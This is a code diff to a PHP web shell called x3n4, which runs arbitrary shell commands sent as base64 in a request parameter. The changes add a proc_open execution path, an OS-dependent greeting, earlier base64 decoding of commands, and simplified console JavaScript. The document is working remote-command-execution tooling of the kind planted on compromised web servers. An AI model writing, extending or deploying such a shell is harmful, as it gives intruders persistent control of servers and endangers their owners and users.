@@ -50,6 +50,24 @@ function execute_command($command)
         case 'exec':
             return @exec($command);
 
+        case 'proc_open':
+            $descriptors = array(
+                0 => array('pipe', 'r'),
+                1 => array('pipe', 'w'),
+                2 => array('pipe', 'w')
+            );
+
+            $process = proc_open($command . ' 2>&1', $descriptors, $pipes, getcwd());
+
+            fclose($pipes[0]);
+            $output = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            $error = stream_get_contents($pipes[2]);
+            fclose($pipes[2]);
+            $code = proc_close($process);
+
+            return $output;
+
         default:
             return 'None available function to run your command, sorry. :(';
     }
@@ -104,6 +122,22 @@ function require_auth($user, $password)
         exit;
     }
 }
+function get_motd()
+{
+    $command = null;
+
+    switch (true) {
+        case stristr(PHP_OS, 'DAR'): $command = 'sw_vers'; break;
+        case stristr(PHP_OS, 'WIN'): $command = 'ver'; break;
+        case stristr(PHP_OS, 'LINUX'): $command = 'cat /etc/motd'; break;
+        default : $command = '';
+    }
+    if (!empty($command)) {
+        return execute_command($command);
+    }
+
+    return 'Welcome to x3n4 '.X3N4_VERSION;
+}
 
 /**
  * CORE
@@ -116,7 +150,7 @@ if (!empty($_SESSION['pwd'])) {
 }
 
 if (isset($_REQUEST['cmd'])) {
-    $REQUESTED_CMD = trim($_REQUEST['cmd']);
+    $REQUESTED_CMD = trim(base64_decode($_REQUEST['cmd']));
     if (empty($REQUESTED_CMD)) {
         exit(0);
     }
@@ -138,8 +172,8 @@ if (isset($_REQUEST['cmd'])) {
         session_destroy();
         exit(0);
     }
-    if (substr($_REQUEST['cmd'], 0, 3) === 'cd ') {
-        $dir = substr($_REQUEST['cmd'], 3);
+    if (substr($REQUESTED_CMD, 0, 3) === 'cd ') {
+        $dir = substr($REQUESTED_CMD, 3);
         $dir = realpath($dir);
         if (chdir($dir)) {
             $_SESSION['pwd'] = $dir;
@@ -147,7 +181,7 @@ if (isset($_REQUEST['cmd'])) {
         }
     }
 
-    $output = execute_command(base64_decode($_REQUEST['cmd']) . ' 2>&1');
+    $output = execute_command($REQUESTED_CMD . ' 2>&1');
     output_json(base64_encode($output));
 }
 
@@ -257,7 +291,7 @@ if (isset($_REQUEST['cmd'])) {
             </div>
 
             <div id="console" role="tabpanel" class="tab-pane active">
-                <pre id="stdout"><?php echo execute_command('cat /etc/motd') . PHP_EOL; ?></pre>
+                <pre id="stdout"><?php echo get_motd() . PHP_EOL; ?></pre>
                 <div class="form-group">
                     <div class="input-group">
                         <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
@@ -288,16 +322,10 @@ if (isset($_REQUEST['cmd'])) {
                     return;
                 }
                 command = Base64.encode(command);
+                $('#stdout').append($('#pwd').html() + " " + Base64.decode(command) + "\n");
                 $.post(this.script_path, {cmd: command}, function(data) {
-                    if (data.stdout) {
-                        $('#stdout').append(data.banner + " " + Base64.decode(command) + "\n");
-                        if (data.stdout !== null) {
-                            $('#stdout').append(Base64.decode(data.stdout));
-                        }
-                        $('#pwd').html(data.banner);
-                    } else {
-                        $('#stdout').append(data);
-                    }
+                    $('#stdout').append(Base64.decode(data.stdout));
+                    $('#pwd').html(data.banner);
                     $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                 });
             }
